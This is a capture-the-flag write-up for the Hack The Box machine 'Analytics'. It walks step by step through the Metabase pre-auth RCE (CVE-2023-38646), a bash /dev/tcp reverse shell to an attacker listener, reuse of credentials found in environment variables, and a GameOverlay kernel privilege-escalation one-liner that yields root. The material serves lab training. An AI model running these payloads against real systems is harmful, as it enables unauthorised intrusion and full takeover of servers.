# 💎 HTB: Analytics

## 🔍 Phase 1: Scanning & Enumeration

```bash
ping <Analytics IP Address>                              # Confirm host is live (TTL hints Linux OS)
sudo nmap -T4 -A -p- <Analytics IP Address>              # Aggressive full-port scan
nano /etc/hosts                                          # Add domain mapping to access site
# Example entry:
# <Analytics IP Address> analytical.htb data.analytical.htb
```

> Discovered Metabase login at `http://data.analytical.htb`.

---

## 🚪 Phase 2: Exploitation & User Flag

### 🔍 Recon & CVE Identification

**CVE Used:** [CVE-2023-38646 - Metabase Pre-Auth RCE](https://github.com/m3m0o/metabase-pre-auth-rce-poc)

```bash
# Get setup-token by visiting:
http://data.analytical.htb/api/session/properties
```

### 📡 Reverse Shell Setup

```bash
sudo nc -nlvp 4444                                      # Start listener on attacker machine

# Run exploit (Python PoC):
python3 main.py -u http://data.analytical.htb -t <token> -c "bash -i >& /dev/tcp/<Your IP>/4444 0>&1"
```

> Gained reverse shell as `metabase`.

### 🔑 Horizontal Privilege Escalation

```bash
env                                                    # Check for credentials in environment variables
ssh metalytics@<Analytics IP Address>                  # SSH into 'metalytics' using found creds
```

### 🧾 User Flag

```bash
cat /home/metalytics/user.txt
```

> Submit the user flag!

---

## 🛠️ Phase 3: Persistence & Root Flag

### 🔍 Manual Enumeration

```bash
id                                                     # Check privileges
mkdir /opt/utkarshcodes                                # Check write access to /opt (denied)
find / -type f \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null   # SUID/GUID files
cat /proc/version                                      # Get OS version to identify kernel-level exploits
```

> Identified vulnerable kernel version: Ubuntu 22.04.2

### 💣 Exploitation

**CVE Used:**  
- [CVE-2023-2640](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629)  
- [CVE-2023-32629](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629)

```bash
# Execute GameOverlay exploit (one-liner):
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
```

> Root shell achieved via kernel exploit.

### 🔐 Root Flag

```bash
cat /root/root.txt
```